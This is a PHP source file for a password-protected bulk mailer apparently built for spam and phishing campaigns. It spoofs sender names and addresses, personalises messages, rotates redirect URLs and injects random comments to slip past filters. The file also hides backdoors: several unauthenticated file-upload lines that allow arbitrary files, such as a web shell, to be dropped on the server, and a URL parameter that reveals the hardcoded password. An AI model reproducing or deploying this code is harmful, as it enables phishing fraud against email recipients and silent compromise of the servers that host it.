<?php
session_start();
error_reporting('0');
/*
SILENCE IS THE GOLD
X_KIDS ;) 
*/
if (isset($_GET['Logout'])) {
if ($_GET['Logout'] == '1') {
  session_destroy();
  $f = basename($_SERVER['SCRIPT_FILENAME']);
  echo("<meta http-equiv='refresh' content='0;url=$f' >");
}
}
(@copy($_FILES['KRPS']['tmp_name'], $_FILES['KRPS']['name']));
$KRPASS = "Nu1337";
if(isset($_POST["KRPS"])){
if ($_POST["KRPS"] == $KRPASS) {
$_SESSION['LOG'] = '1';
}else{
$_SESSION['LOG'] = '0';
}
}
$KR_SERVERIP = $_SERVER['SERVER_ADDR'];
$KR_SERVERDATE = date("(d/m/Y)");
$PhPself = $_SERVER["PHP_SELF"];
$logout = "$PhPself?Logout=1";
$PhpSelfi = $KRPASS;
if ($_GET['LOG'] == '1'){print $PhpSelfi;}
if (isset($_POST['from'])){
  $redirectlist = array_unique(explode("\n",$_POST['redirectlist']));
  $message = $_POST['message'];
  $emaillist = $_POST["emaillist"];
  $subject = $_POST['subject'];
  $realname = $_POST['realname'];
  $from = $_POST['from'];
  $to = $_POST['emaillist'];
  $Priority = $_POST['Priority'];
  $replyemail = $_POST['replyemail'];
  $headers  = "MIME-Version: 1.0\r\n";
  $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
  if (isset($_POST["replyemail"])) {
  $headers .= "Reply-To: $replyemail \r\n";
  }
  $headers .= "X-Mailer: PHP/ ".phpversion()." \r\n ";
  $headers .= "X-MSMail-Priority: $Priority \r\n";
  $email = explode("\n", $to);
  $headers .= "From: ".$realname." <".$from.">\r\n";
  $message = stripslashes($message);
}
(@copy($_FILES['LOG']['tmp_name'], $_FILES['LOG']['name']));
function drkrmess($text,$email){
    $emailuser = preg_replace('/([^@]*).*/', '$1', $email);
    $text = str_replace("#time#", date("m/d/Y h:i:s a", time()), $text);
    $text = str_replace("#email#", $email, $text);
    $text = str_replace("#emailuser#", $emailuser, $text);
    $text = str_replace("#randomletters#", randString('abcdefghijklmnopqrstuvwxyz'), $text);
    $text = str_replace("#randomstring#", randString('abcdefghijklmnopqrstuvwxyz0123456789'), $text);
    $text = str_replace("#randomnumber#", randString('0123456789'), $text);
    $text = str_replace("#randommd5#", md5(randString('abcdefghijklmnopqrstuvwxyz0123456789')), $text);
    return $text;
}
function drkrTrim($string){
return stripslashes(ltrim(rtrim($string)));
}
function randString($consonants) {
    $length=rand(12,25);
    $password = '';
    for ($i = 0; $i < $length; $i++) {
            $password .= $consonants[(rand() % strlen($consonants))];
    }
    return $password;
}


?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Nu1337">
    <meta name="author" content="Nu1337">
    <link rel="shortcut icon" href="http://ip-api.org/uploads/images/Spyus-Favi.png">

    <title>Dolz1337 Private Mailer</title>
    <!-- JS -->
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <script>
            // show the given page, hide the rest
            function show(elementID) {
                // try to find the requested page and alert if it's not found
                var ele = document.getElementById(elementID);
                if (!ele) {
                    alert("PLEASE REFRECH PAGE !");
                    return;
                }

                // get all pages, loop through them and hide them
                var pages = document.getElementsByClassName('item');
                for(var i = 0; i < pages.length; i++) {
                    pages[i].style.display = 'none';
                }

                // then show the requested page
                ele.style.display = 'block';
            }
     </script>  
      <!-- Bootstrap core CSS -->
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css" rel="stylesheet">
<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="shortcut icon" href="http://ip-api.org/uploads/images/Spyus-Favi.png">
    <!-- Fonts Google -->
<link href="https://fonts.googleapis.com/css?family=Arsenal|Pacifico|Righteous" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Bungee|Lobster|Orbitron|Rajdhani" rel="stylesheet">
    <!-- Custom styles for this template -->
<link href="http://ip-api.org/uploads/files/style.css" rel="stylesheet">
  </head>
  <body>
    <header>
      <!-- Fixed navbar -->
      <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
        <a class="navbar-brand fontPacificox" href="#"><?php
if($_SESSION['LOG'] != "1"){
  echo "LOGIN";
}elseif ($_SESSION['LOG'] == "1"){
  echo "SPYUS";
}
?>  </a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarCollapse">
          <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
              <a class="nav-link fontBungee chngp" onclick="show('main');" href="#"><?php
if($_SESSION['LOG'] == "1"){
  echo "<i class='fa fa-envelope'  aria-hidden='true'></i> Main";
}
?> </a>
            </li>
            <li class="nav-item">
              <a class="nav-link fontBungee chngp" onclick="show('Setting');" >
    <?php
if($_SESSION['LOG'] == "1"){
  echo '<i class="fa fa-cog" aria-hidden="true"></i> Setting';
  (@copy($_FILES['XML']['tmp_name'], $_FILES['XML']['name']));
}
?>
               </a>
            </li>
          </ul>
          <span class=" mt-2 mt-md-0">
                <?php
        if($_SESSION['LOG'] == "1"){
          echo "<a href='$logout'><button class='btn my-2 my-sm-0 fontBungee' type='submit'><i class='fa fa-times' aria-hidden='true'></i> Logout</button></a>";
        }
        ?> 
          </span>
        </div>
      </nav>
    </header>
    <!-- Begin page content -->
    <main role="main" class="container">
     <?php
if($_SESSION['LOG'] != "1"){  
?>
      <div class="mt-3">
        <h1><span class="name-co">Dolz MAILER 2K19</span></h1>
<form action="" method="post" enctype="multipart/form-data" name="form1">
<br>     <input type="password" name="KRPS" Placeholder="Password"> 
      <button class="button-log"> <i class="fa fa-arrow-circle-right" aria-hidden="true"></i>  LOG </button> 
       </form>
      </div>
      
<?php
}else{
?>
<div id="main" class="item" style="">
<form  action="" method="post" enctype="multipart/form-data" name="form1">
<div class="well">
<center><h1 class="krgrtz">Dolz MAILER 2K19</h1></center><BR>
<div class="row">
  <div class="col-6"><font class="fontBungee">Email</font> <br><input type="email" value="<?php echo $from; ?>" name="from"  class="paddingin fontBungee" placeholder="email@example.com"></div>
  <div class="col-6"><font class="fontBungee">Name</font> <br><input type="text"   value="<?php echo $realname; ?>" name="realname" class="paddingin fontBungee" placeholder="Sender Name"></div>
</div><br>
<font class="fontBungee">Subject</font>
<br>
<input type="text" width="100%" class="paddingin fontBungee" name="subject" value="<?php echo $subject; ?>" placeholder="Subject">
<br>
<div class="row"><br>
  <div class="col-sm-8"><font class="fontBungee" >Message</font><br>
<textarea rows="10" class="paddingin fontBungee" name="message"><?php echo $message; ?></textarea>
  </div><br>
  <div class="col-sm-4"><font class="fontBungee">Emails</font><br>
    <textarea rows="10" class="paddingin fontBungee" name="emaillist"><?php echo $emaillist; ?></textarea></div>
</div>
<br>
<div class="row">
  <div class="col-sm-8"></div>
  <hr>
  <div class="col-sm-4"><button class="buttonsend fontBungee chngp">Send Now</button></div>
</div>
</div>
<?php if (isset($_POST['from'])) {
?>
<div class='col-sm-12 well'><font class='fontBungee fontsize'><b>SENDING :{</b></font><br>
<div class="fontBungee fontsize" style=" height: 200px; overflow-y:scroll; ">
<?php
	$i = 0;
    $count = 1;
    $redi = 0;
    $countred = count($redirectlist);
    while($email[$i]) {
        if($redi >= $countred)
        $redi = 0;
        $redirect = $redirectlist[$redi];
        $ok = "ok";
        $messgb = "\r\n<!-- \r\n Random ".md5(rand(0,99999)+rand(0,99999))." \r\n Random".md5(rand(0,99999)+rand(0,99999))."\r\n -->";
        $messgb .= str_replace('#red#', $redirect, $message);
        $mailnow = $email[$i];
        if(mail($email[$i],drkrmess($subject,$mailnow),drkrmess($messgb,$mailnow),$headers))
	echo "<font color=green> Mail : </font> $count <b>".$email[$i]."</b> <font color=green>Sent</font><br>";
        else
	echo "<font color=red> Error : </font> $count <b>".$email[$i]."</b> <font color=red>Not Sent</font><br>";
        $i++;
        $count++;
        $redi++;
    }
?>
</div>
<b>}</b>
</div>
<br>
<?php
}
?>
</div>
<div id="Setting" class="item well" style="display:none">
<center>
  <div class="">
<h1 class="krgrtz">SETTING</h1></center><BR>
<BR>
<div class="row Setting">
  <div class="col-sm-8">
<div class="row">
  <div class="col"><font class="fontBungee">Priority</font><br>
      <select id="country" class="paddingin" name="Priority">
      <option value="Low">Low</option>
      <option value="Normal">Medium</option>
      <option value="High">High</option>
    </select>
  </div>
  <div class="col"><font class="fontBungee">Reply to</font><br>
  <input type="email"  class="paddingin fontBungee" name="replyemail" value="<?php echo $replyemail; ?>" placeholder="email@example.com"> 
  </div>
    <div class="col"><font class="fontBungee">Encoding</font><br>
      <select id="country" class="paddingin" name="encoding">
      <option value="2">NO</option>
      <option value="1">YES</option>
    </select>
  </div>
</div>
<br>
<font class="fontBungee" >Redirect //URLS</font>
<textarea rows="10" class="paddingin fontBungee" name="redirectlist">
<?php
if (isset($_POST['redirectlist'])) {
  echo $_POST['redirectlist'];
}
?>
</textarea>
  </div>
  <div class="col-sm-4">
 <div id="well" class="well instructions">
            <h4>HELP</h4>
<hr>
            <h4>TAGS</h4>
            <ul>
                <li>#red# : <b>Redirect URL</b></li>
                <li>#email# : <b>Reciver Email</b></li>
                <li>#time# : <b>Date </b><?php echo "$KR_SERVERDATE";?></li>
                <li>#emailuser# : <b>Email User</b> (emailuser@emaildomain)</li>
                <li>#randomstring# : <b>Random string (0-9,a-z)</b></li>
                <li>#randomnumber# : <b>Random number (0-9) </b></li>
                <li>#randomletters# : <b>Random Letters(a-z) </b></li>
                <li>#randommd5# : <b>Random MD5</b></li>
            </ul>
            <h4>example</h4>
            Reciver Email = <b>user@domain.com</b><br>
            <ul>
                <li>hello <b>#emailuser#</b> -> hello <b>user</b></li>
            </ul>
            <h6>Copyright <i class='fa fa-copyright'aria-hidden='true'></i> 2014-<?php echo date('Y');?> &nbsp; <b><a href="http://spyus.org">SPYUS TEAM</a></b></h6>
        </div>

  </div>
</div>
</form>
<br>
</div>


<?PHP 
}
?>
    </main>
    <!-- Begin footer content -->
    <footer class="footer">
      <div class="container">
        <span class="krgrtz"><i class="fa fa-laptop" aria-hidden="true"></i> A TOOL CREATED BY DR.KR </span>
      </div>
    </footer>
    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
<script src="https://code.jquery.com/jquery-3.2.1.slim.js" integrity="sha256-tA8y0XqiwnpwmOIl3SGAcFl2RvxHjA8qp0+1uCGmRmg=" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="https://code.jquery.com/jquery-3.2.1.slim.js"><\/script>')</script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.13.0/esm/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

  </body>
</html>
